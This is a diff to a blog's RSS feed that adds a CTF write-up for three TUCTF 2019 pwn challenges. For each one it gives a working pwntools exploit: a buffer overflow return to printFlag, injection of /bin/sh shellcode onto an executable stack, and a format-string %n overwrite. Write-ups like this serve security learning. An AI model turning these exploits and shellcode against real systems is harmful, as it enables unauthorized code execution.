@@ -5,12 +5,242 @@
     <link>/tags/infosec/</link>
       <atom:link href="/tags/infosec/index.xml" rel="self" type="application/rss+xml" />
     <description>infosec</description>
-    <generator>Source Themes Academic (https://sourcethemes.com/academic/)</generator><language>en-us</language><copyright>© Shreyansh Singh 2019</copyright><lastBuildDate>Tue, 19 Nov 2019 17:31:59 +0000</lastBuildDate>
+    <generator>Source Themes Academic (https://sourcethemes.com/academic/)</generator><language>en-us</language><copyright>© Shreyansh Singh 2019</copyright><lastBuildDate>Mon, 02 Dec 2019 19:39:57 +0530</lastBuildDate>
     <image>
       <url>/img/Shreyansh.jpg</url>
       <title>infosec</title>
       <link>/tags/infosec/</link>
     </image>
+    
+    <item>
+      <title>TUCTF 2019 - Pwn Challenges</title>
+      <link>/post/2019-12-02_tuctf-pwn-2019/</link>
+      <pubDate>Mon, 02 Dec 2019 19:39:57 +0530</pubDate>
+      <guid>/post/2019-12-02_tuctf-pwn-2019/</guid>
+      <description>&lt;p&gt;I couldn&#39;t give much time to the CTF because of some college work, but I gave a shot at the PWN challenges. The challenges became offline later but I still decided to work on the exploit scripts to make them work locally.&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;thefirst--379-pts&#34;&gt;thefirst - 379 pts&lt;/h2&gt;
+&lt;p&gt;We can see in the image below that &lt;code&gt;gets&lt;/code&gt; is being used to take the input. Hence it can be exploited for &lt;em&gt;buffer overflow&lt;/em&gt;. First, using GDB (with GEF), we find that the offset required to overflow the buffer is 24.&lt;/p&gt;
+
+
+
+
+
+
+
+
+
+
+
+
+
+&lt;figure&gt;
+
+
+  &lt;a data-fancybox=&#34;&#34; href=&#34;/post/2019-12-02_tuctf-pwn-2019/images/thefirst_1.png&#34; data-caption=&#34;Disassembly of main&#34;&gt;
+&lt;img src=&#34;/post/2019-12-02_tuctf-pwn-2019/images/thefirst_1.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;
+
+
+  
+  
+  &lt;figcaption&gt;
+    Disassembly of main
+  &lt;/figcaption&gt;
+
+
+&lt;/figure&gt;
+
+&lt;p&gt;This can be done using &lt;code&gt;pattern create 50&lt;/code&gt; and then using that pattern to find the crash offset.&lt;/p&gt;
+
+
+
+
+
+
+
+
+
+
+
+
+
+&lt;figure&gt;
+
+
+  &lt;a data-fancybox=&#34;&#34; href=&#34;/post/2019-12-02_tuctf-pwn-2019/images/gef_1.png&#34; &gt;
+&lt;img src=&#34;/post/2019-12-02_tuctf-pwn-2019/images/gef_1.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;
+
+
+
+&lt;/figure&gt;
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+&lt;figure&gt;
+
+
+  &lt;a data-fancybox=&#34;&#34; href=&#34;/post/2019-12-02_tuctf-pwn-2019/images/gef_2.png&#34; &gt;
+&lt;img src=&#34;/post/2019-12-02_tuctf-pwn-2019/images/gef_2.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;
+
+
+
+&lt;/figure&gt;
+
+&lt;p&gt;Also inspecting the functions, we see that there is a &lt;code&gt;printFlag&lt;/code&gt; function at 0x80491f6. So, our objective is to jump there.&lt;/p&gt;
+&lt;p&gt;The following script is the exploit.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pwn &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
+
+p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; process(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;./thefirst&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
+&lt;span style=&#34;color:#75715e&#34;&gt;# p = remote(&amp;#34;chal.tuctf.com&amp;#34;, 30508)&lt;/span&gt;
+print_flag_addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x80491f6&lt;/span&gt;
+offset &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;
+
+payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;A&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;offset
+payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;BBBB&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
+payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p32(print_flag_addr)
+
+f &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; open(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;payload&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;wb&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
+f&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(payload)
+f&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;close()
+
+p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;gt; &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
+p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(payload)
+
+p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interactive()
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
+&lt;h2 id=&#34;shellme32--462-pts&#34;&gt;shellme32 - 462 pts&lt;/h2&gt;
+&lt;p&gt;On running the program, we are given an address and we have to provide some input. On analysing it using GDB, and using &lt;code&gt;vmmap&lt;/code&gt;, we find that the adress given to us is that of the stack and the stack is read, write and executable.&lt;/p&gt;
+
+
+
+
+
+
+
+
+
+
+
+
+
+&lt;figure&gt;
+
+
+  &lt;a data-fancybox=&#34;&#34; href=&#34;/post/2019-12-02_tuctf-pwn-2019/images/shellme32_1.png&#34; &gt;
+&lt;img src=&#34;/post/2019-12-02_tuctf-pwn-2019/images/shellme32_1.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;
+
+
+
+&lt;/figure&gt;
+
+&lt;p&gt;We use &lt;a href=&#34;http://shell-storm.org/shellcode/files/shellcode-811.php&#34;&gt;shell-storm&lt;/a&gt; to get the shellcode. First we get the offset of the crash like before. In the script below, we use the shellcode, pad it with &amp;lsquo;A&#39;s and then provide the address to write to, i.e. the adress provided to us.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;shellcode &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x31&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xc0&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x50&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x68&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x2f&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x2f&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x73&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x68&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x68&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x2f&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x62&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x69&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x6e&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x89&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xe3&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x89&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xc1&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x89&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xc2&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xb0&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x0b&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xcd&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x80&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x31&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xc0&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x40&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xcd&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x80&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
+len_shell_code &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;
+
+&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pwn &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;# context.log_level = &amp;#39;debug&amp;#39;&lt;/span&gt;
+p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; process(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;./shellme32&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
+
+offset &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;
+
+
+p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;?&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
+addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; int(p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvline()&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;strip(), &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;)
+p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;gt; &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
+
+log&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;info(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Stack Address: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; str(hex(addr)))
+
+payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; shellcode
+payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;A&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(offset &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; len_shell_code)
+
+payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p32(addr)
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(len(shellcode))
+p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(payload)
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;with&lt;/span&gt; open(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;payload&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;wb&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;as&lt;/span&gt; f:
+    f&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(payload)
+
+p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interactive()
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
+&lt;h2 id=&#34;printfun--500-pts&#34;&gt;printfun - 500 pts&lt;/h2&gt;
+&lt;p&gt;Here, on analysing with Ghidra, we find that there is a format string vulnerability.&lt;/p&gt;
+
+
+
+
+
+
+
+
+
+
+
+
+
+&lt;figure&gt;
+
+
+  &lt;a data-fancybox=&#34;&#34; href=&#34;/post/2019-12-02_tuctf-pwn-2019/images/printfun_1.png&#34; &gt;
+&lt;img src=&#34;/post/2019-12-02_tuctf-pwn-2019/images/printfun_1.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;
+
+
+
+&lt;/figure&gt;
+
+&lt;p&gt;So, here first we use GDB to get the addresses of the two buffers being compared. Also, as input if we provide &lt;code&gt;&amp;quot;%x %x %x %x %x %x %x %x %x %x %x %x %x %x&amp;quot;&lt;/code&gt;, for the instance running on GDB we get this output -&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;5655a050 3c 14 1 ffffc994 5655a050 5655a008 ffffc900 0 0 f7e06637 f7fa0000 f7fa0000 0&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;On seeing the values displayed by GDB, we see two addresses - &lt;code&gt;0x5655a008&lt;/code&gt; and &lt;code&gt;0x5655a050&lt;/code&gt;&lt;/p&gt;
+
+
+
+
+
+
+
+
+
+
+
+
+
+&lt;figure&gt;
+
+
+  &lt;a data-fancybox=&#34;&#34; href=&#34;/post/2019-12-02_tuctf-pwn-2019/images/printfun_2.png&#34; &gt;
+&lt;img src=&#34;/post/2019-12-02_tuctf-pwn-2019/images/printfun_2.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;
+
+
+
+&lt;/figure&gt;
+
+&lt;p&gt;This is intereting as both these addresses are also present in the program&#39;s output with our input.&lt;/p&gt;
+&lt;p&gt;So, all we have to do is overwrite the 6th and 7th &amp;ldquo;addresses&amp;rdquo; of the output to the same value so that the string comparison passes.&lt;/p&gt;
+&lt;p&gt;We write the following exploit code, which works locally. I hope it would work remotely as well (but no way to test it now ☹) -&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pwn &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
+
+p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; process(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;printfun&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
+
+payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;AAAA&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;6$n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;7$n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
+
+p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;? &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;, payload)
+
+p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interactive()
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;That&#39;s all for now 👋.&lt;/p&gt;
+&lt;p&gt;I&#39;m working on a few more of the PWN challenges and also on the REV ones which I found very interesting. Will be posting their writeups too.&lt;/p&gt;
+</description>
+    </item>
     
     <item>
       <title>RITSEC CTF 2019</title>
